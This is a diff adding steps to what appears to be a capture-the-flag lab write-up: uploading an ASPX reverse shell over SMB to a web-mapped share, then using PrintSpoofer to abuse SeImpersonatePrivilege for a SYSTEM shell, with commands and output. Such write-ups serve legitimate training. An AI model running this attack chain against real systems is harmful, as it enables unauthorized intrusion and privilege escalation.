@@ -541,7 +541,44 @@ Brute force directory
 	...
  	nt4wrksv                [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 72ms]
 
-Check if it is the shared folder we found before is actually mapped on the webserver:
+Check if it is the shared folder we found before is actually mapped on the webserver: http://10.10.157.7:49663/nt4wrksv/passwords.txt.
+Then we can upload a reverse shell:
+
+	smb: \> put shell.aspx 
+	putting file shell.aspx as \shell.aspx (36.6 kb/s) (average 36.6 kb/s)
+
+ Then visit: http://10.10.157.7:49663/nt4wrksv/shell.aspx. Once you get the shell check privileges:
+
+ 	whoami /priv
+
+	PRIVILEGES INFORMATION
+	----------------------
+	
+	Privilege Name                Description                               State   
+	============================= ========================================= ========
+	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+	...
+	SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+
+Since <b>SeImpersonatePrivilege</b> is enabled we can escalate out privileges using some tools, I used PrintSpoofer: https://github.com/itm4n/PrintSpoofer
+
+ 	smb: \> put PrintSpoofer64.exe 
+	putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (51.4 kb/s) (average 141.9 kb/s)
+
+Then we can execute the following command to get a shell as system:
+
+	C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
+	PrintSpoofer64.exe -i -c cmd
+	[+] Found privilege: SeImpersonatePrivilege
+	[+] Named pipe listening...
+	[+] CreateProcessAsUser() OK
+	Microsoft Windows [Version 10.0.14393]
+	(c) 2016 Microsoft Corporation. All rights reserved.
+	
+	C:\Windows\system32>whoami
+ 	nt authority\system
+
+More information: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
 
 	
 	
